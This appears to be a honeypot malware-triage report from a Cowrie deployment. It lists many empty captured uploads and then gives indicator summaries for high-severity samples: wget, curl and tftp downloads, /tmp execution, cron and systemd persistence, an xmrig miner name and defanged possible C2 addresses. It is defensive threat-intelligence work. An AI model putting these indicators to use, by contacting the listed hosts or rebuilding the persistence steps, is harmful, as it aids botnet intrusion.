| `tmpjumcsxpf` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpjvt4nagk` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpjy31kwro` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpk118wfj9` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpkbb_l5w4` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpkl80yfqh` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpko26kpjb` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpktf8uk4r` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpkvhxx054` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpl0xtqx1k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpl339ev0c` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpl53sey7p` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpl6ax_vxc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpl7apayqa` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpl_5jlk0u` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmplemvnf3l` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmplg4i2o4i` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmplhrxhc4d` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpm3ngdg4t` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpm_v8uig3` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpmc44hu_p` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpme_yv272` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpmg8etrr8` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpmi1v751_` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpmiy7y2q7` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpmklpy36k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpn4kc0str` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpn81tmdfj` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpne6cj599` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnilkjw6t` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnisvuzjm` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnnamkgxl` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnnvfnp2p` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnogcez_x` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnrk6sgau` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnvagwuzr` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpnxjwmq5h` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpo1d1l4xj` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpo2lewowq` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpo5q86tzt` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpodlv5v42` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpoo9e3aje` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpos0tbb9r` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpotf9qx8a` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpoyez2pbn` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpp1zscacs` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmppcntk1_4` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmppght2uja` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmppk840fg8` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmppm393gxp` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpq20zik_a` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpq5z0363j` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpq674gz4q` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpq_xg38et` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpqk0c9c0o` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpqow102u6` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpqvrjxqa8` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpqy3ty8gs` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpramkajxz` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmprdo5ycm7` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmprrhsvipt` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmprzrqqo2t` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmps0of60rt` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpsjh3xark` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpsl6dyspn` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpsmhq06mu` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpsn1_bzrt` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpstbbgleb` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpsvr5jt3m` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpszs4dit6` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpszy19c_o` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpt2hbd00v` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmptaw2l0d3` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpteokfva8` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmptgqzee0m` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpthklxiab` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmptr4b3mrk` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmptrev15cy` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmptwf4_jmo` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmptx4yq8xk` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpufn8itnd` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpv4ik5xks` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpvsmm2jfh` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpw41vbrt1` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpw6v7bnxa` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpw_gty_4j` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwadjhk8_` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpweb9aqfh` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwgtdq6sh` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwhl83mba` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwi_fa0xs` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwimy2evr` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwjjou8aq` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwmwel4vl` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwo5ok1ri` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwq61v99_` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpwxkc6n7v` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpx19i6l3b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpx54r7z5t` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpx7smpym6` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpx_fhkfws` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpxlqkiihi` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpxm3upq8r` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpxo7jdfke` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpxtfvqq59` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpxtrg25u4` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpy9yr05rc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpyd2svsny` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpyeku8hs0` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpyi6hnnre` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpyod5kzf7` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpyp487jfp` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpz5x3yd9v` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpz6dhiesd` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpz95zbg8f` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpzc663i2_` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpzeho7h1m` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpzk0h_ep_` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpzk_884sk` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpzlkzb_09` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmpzo1rmb5x` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

_`20d4672f40c452d53b41227f669c481703677e302954c52158515f7003d2fb27` (20d4672f40c452d53b41227f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`30e0cb05a8c207c4084adaeb2906cbb8119b3d638999a73d4635e333e09cc0f6` (30e0cb05a8c207c4084adaeb...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`378d2c4805956c99701a68bc06c815ca60cd73d0bf2c675a1090ecfea1aa5156` (378d2c4805956c99701a68bc...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3e5586f6993bed97ae83472729a872385ddfde061e3c9eed7fbdeb401b738fde` (3e5586f6993bed97ae834727...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`3e724458a4b817aad81a70746f397fc4830da3ab02d465f53dcf8e6af9a8391e` (3e724458a4b817aad81a7074...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`3f17516cc8a591208afb7c49e156643dee6428a238b1d50a7be0443f4a866d24` (3f17516cc8a591208afb7c49...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.g_`
- `IP:Port (possible C2)` — `176.65.134[.]119:80`

_`4079145398fad617557fdc44e63c49edbaeafb3744f1804aec0e430214e397b8` (4079145398fad617557fdc44...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`488cd4b95923b20587debbd1a747d9e04b85b3ff2b274e36660401e194576626` (488cd4b95923b20587debbd1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`4c463687adab59995dc46225c0df38a12da6ffd828b1a46a162e75ba604897ad` (4c463687adab59995dc46225...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`5003d4cf1849fc207f3023b7220800f998cc34ec416ca3525f2707711258b98a` (5003d4cf1849fc207f3023b7...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`51caf63a51a28343a2766566ece2c8d83725de5000c5420ccf491bb5bf2ebe39` (51caf63a51a28343a2766566...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`586960df8bf559ffbba600f11917a99baed4a875cb7faa5eabc060bcde67277b` (586960df8bf559ffbba600f1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`588390c5d2115707e120fd4286c61216ca80b02f33610669875083edf1671262` (588390c5d2115707e120fd42...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`591e135c571321fed659c2d5a763a4685333e2b1bccd35d19e51a1196878c01f` (591e135c571321fed659c2d5...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

